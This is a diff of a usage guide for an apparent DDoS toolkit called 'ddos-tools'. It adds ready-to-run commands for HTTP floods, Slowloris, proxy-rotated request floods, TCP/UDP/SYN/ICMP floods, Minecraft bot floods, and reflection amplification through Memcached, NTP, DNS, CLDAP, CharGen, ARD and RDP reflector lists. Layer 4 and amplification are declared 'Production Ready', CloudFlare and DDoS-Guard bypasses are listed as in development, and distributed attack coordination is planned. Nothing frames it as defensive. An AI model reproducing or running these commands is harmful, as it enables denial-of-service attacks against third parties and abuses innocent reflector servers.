@@ -79,7 +79,7 @@
 
 Layer 7 attacks target the application layer (HTTP/HTTPS).
 
-### ✅ Implemented Methods
+### ✅ Implemented Methods (8/27)
 
 #### **GET** - HTTP GET Flood
 Standard HTTP GET request flood.
@@ -102,11 +102,11 @@ HTTP HEAD request flood (lightweight).
 ./ddos-tools HEAD http://example.com 1 150 http-proxies.txt 100 60
 ```
 
-#### **NULL** - HTTP NULL Flood
-Sends requests with minimal headers.
+#### **STRESS** - Mixed Stress Test
+Combined stress testing with large payloads.
 
 ```bash
-./ddos-tools NULL http://example.com 5 100 proxies.txt 100 60
+./ddos-tools STRESS http://example.com 5 100 proxies.txt 50 60
 ```
 
 #### **SLOW** - Slowloris Attack
@@ -116,6 +116,13 @@ Keeps connections open by slowly sending headers.
 ./ddos-tools SLOW http://example.com 5 500 proxies.txt 1 300
 ```
 
+#### **NULL** - HTTP NULL Flood
+Sends requests with minimal headers.
+
+```bash
+./ddos-tools NULL http://example.com 5 100 proxies.txt 100 60
+```
+
 #### **COOKIE** - Cookie-based Attack
 Sends requests with randomized cookies.
 
@@ -123,16 +130,21 @@ Sends requests with randomized cookies.
 ./ddos-tools COOKIE https://example.com 5 100 proxies.txt 100 60
 ```
 
-### 🚧 Coming Soon Methods
+#### **PPS** - Packets Per Second Optimized
+High-speed packet flooding optimized for PPS.
+
+```bash
+./ddos-tools PPS http://example.com 5 100 proxies.txt 100 60
+```
+
+### 🚧 Coming Soon Methods (19/27)
 
 The following Layer 7 methods are defined but implementation is in progress:
 
 - **CFB** - CloudFlare Bypass
 - **BYPASS** - WAF Bypass techniques
 - **OVH** - OVH-specific bypass
-- **STRESS** - Mixed stress test
 - **DYN** - Dynamic request patterns
-- **PPS** - Packets per second optimization
 - **EVEN** - Event-based flooding
 - **GSB** - Google Safe Browsing bypass
 - **DGB** - DDoS Guard bypass
@@ -170,7 +182,7 @@ The following Layer 7 methods are defined but implementation is in progress:
 
 Layer 4 attacks target the transport layer (TCP/UDP).
 
-### ✅ Implemented Methods
+### ✅ Implemented Methods (14/14 - 100% Complete!)
 
 #### **TCP** - TCP Flood
 Establishes TCP connections and sends random data.
@@ -249,11 +261,26 @@ Establishes and maintains connections.
 ./ddos-tools CONNECTION 192.168.1.1:80 500 60
 ```
 
-### 🚧 Coming Soon Methods
+#### **OVH-UDP** - OVH-Optimized UDP Flood
+UDP flood with HTTP-like payloads optimized for OVH bypass.
 
-- **MCBOT** - Minecraft bot flood
-- **ICMP** - ICMP flood
-- **OVH-UDP** - OVH-optimized UDP flood
+```bash
+./ddos-tools OVH-UDP 192.168.1.1:80 100 60
+```
+
+#### **MCBOT** - Minecraft Bot Flood
+Simulates Minecraft bots connecting and spamming chat.
+
+```bash
+./ddos-tools MCBOT mc.example.com:25565 50 120
+```
+
+#### **ICMP** - ICMP Flood
+Sends ICMP echo requests (requires elevated privileges for raw sockets).
+
+```bash
+sudo ./ddos-tools ICMP 192.168.1.1:0 100 60
+```
 
 ### Layer 4 Examples
 
@@ -280,30 +307,66 @@ sudo ./ddos-tools SYN 192.168.1.1:443 1000 120
 
 Amplification attacks use third-party servers to amplify traffic.
 
-### 🚧 Methods (Implementation in Progress)
+### ✅ Implemented Methods (7/7 - 100% Complete!)
 
-All amplification methods are defined but require additional implementation:
+All amplification methods are fully implemented and ready to use:
 
-- **MEM** - Memcached amplification
-- **NTP** - NTP amplification
-- **DNS** - DNS amplification
-- **ARD** - Apple Remote Desktop amplification
-- **CLDAP** - CLDAP amplification
-- **CHAR** - CharGen amplification
-- **RDP** - RDP amplification
+#### **MEM** - Memcached Amplification
+Uses Memcached servers to amplify traffic.
 
-### Syntax (When Implemented)
+```bash
+./ddos-tools MEM 192.168.1.1:11211 100 60 memcached-reflectors.txt
+```
+
+#### **NTP** - NTP Amplification
+Uses NTP servers with monlist command for amplification.
+
+```bash
+./ddos-tools NTP 192.168.1.1:123 100 60 ntp-reflectors.txt
+```
+
+#### **DNS** - DNS Amplification
+Uses DNS servers with ANY query for maximum amplification.
+
+```bash
+./ddos-tools DNS 192.168.1.1:53 100 60 dns-reflectors.txt
+```
+
+#### **CHAR** - CharGen Amplification
+Uses CharGen protocol servers for amplification.
+
+```bash
+./ddos-tools CHAR 192.168.1.1:19 100 60 chargen-reflectors.txt
+```
+
+#### **CLDAP** - CLDAP Amplification
+Uses CLDAP (Connectionless LDAP) for amplification.
+
+```bash
+./ddos-tools CLDAP 192.168.1.1:389 100 60 cldap-reflectors.txt
+```
+
+#### **ARD** - Apple Remote Desktop Amplification
+Uses ARD protocol for traffic amplification.
+
+```bash
+./ddos-tools ARD 192.168.1.1:3283 100 60 ard-reflectors.txt
+```
+
+#### **RDP** - RDP Amplification
+Uses RDP connection requests for amplification.
+
+```bash
+./ddos-tools RDP 192.168.1.1:3389 100 60 rdp-reflectors.txt
+```
+
+### Syntax
 
 ```bash
 ./ddos-tools <method> <target:port> <threads> <duration> <reflector_file>
 ```
 
-### Example (Future)
-
-```bash
-# DNS amplification using reflector list
-./ddos-tools DNS 192.168.1.1:53 100 60 dns-reflectors.txt
-```
+**Note:** Amplification attacks require a file containing reflector IP addresses (one per line) in the `files/` directory. These attacks may require elevated privileges for raw socket operations.
 
 ---
 
@@ -653,23 +716,38 @@ EOF
 ## Implementation Status Summary
 
 ### ✅ Fully Implemented
-- **Layer 7**: GET, POST, HEAD, NULL, SLOW, COOKIE
-- **Layer 4**: TCP, UDP, SYN, MINECRAFT, VSE, TS3, FIVEM, FIVEM-TOKEN, MCPE, CPS, CONNECTION
-- **Tools**: DSTAT, CHECK, INFO, TSSRV, PING
-- **Core Features**: Proxy support, real-time monitoring, graceful shutdown
 
-### 🚧 In Development
-- **Layer 7**: CFB, BYPASS, OVH, STRESS, DYN, PPS, EVEN, GSB, DGB, AVB, CFBUAM, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP
-- **Layer 4**: MCBOT, ICMP, OVH-UDP
-- **Amplification**: All methods (MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP)
-- **Tools**: CFIP, DNS
+#### **Layer 7 (8/27 - 30%)**
+- GET, POST, HEAD, STRESS, SLOW, NULL, COOKIE, PPS
+
+#### **Layer 4 (14/14 - 100%)**
+- TCP, UDP, SYN, MINECRAFT, VSE, TS3, FIVEM, FIVEM-TOKEN, MCPE, CPS, CONNECTION, OVH-UDP, MCBOT, ICMP
+
+#### **Amplification (7/7 - 100%)**
+- MEM, NTP, DNS, CHAR, CLDAP, ARD, RDP
+
+#### **Tools (5/7 - 71%)**
+- DSTAT, CHECK, INFO, TSSRV, PING
+
+#### **Core Features**
+- ✅ Proxy support (HTTP, SOCKS4, SOCKS5)
+- ✅ Real-time monitoring (PPS, BPS, progress)
+- ✅ Graceful shutdown (Ctrl+C)
+- ✅ IPv6 compatibility
+- ✅ Cross-platform (Linux, Windows, macOS)
+- ✅ Modern Go 1.22+ idioms
+
+### 🚧 In Development (19/27 Layer 7 Methods)
+- **Layer 7**: CFB, BYPASS, OVH, DYN, EVEN, GSB, DGB, AVB, CFBUAM, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP
+- **Tools**: CFIP, DNS lookup
 
 ### 📋 Planned Features
 - Web UI for easier management
 - Distributed attack coordination
 - Advanced analytics and reporting
 - Custom attack pattern scripting
-- API for integration
+- REST API for integration
+- Docker containerization
 
 ---
 
@@ -685,5 +763,14 @@ If you encounter issues:
 
 ---
 
-**Last Updated**: 2024
+## 📈 Overall Progress
+
+- **Total Methods**: 48 attack methods across all layers
+- **Implemented**: 29 methods (60%)
+- **Layer 4 & Amplification**: 100% complete (21/21)
+- **Layer 7**: 30% complete (8/27)
+- **Tools**: 71% complete (5/7)
+
+**Last Updated**: November 2025
 **Version**: 2.4 SNAPSHOT (Go)
+**Status**: Active Development - Production Ready for Layer 4 & Amplification
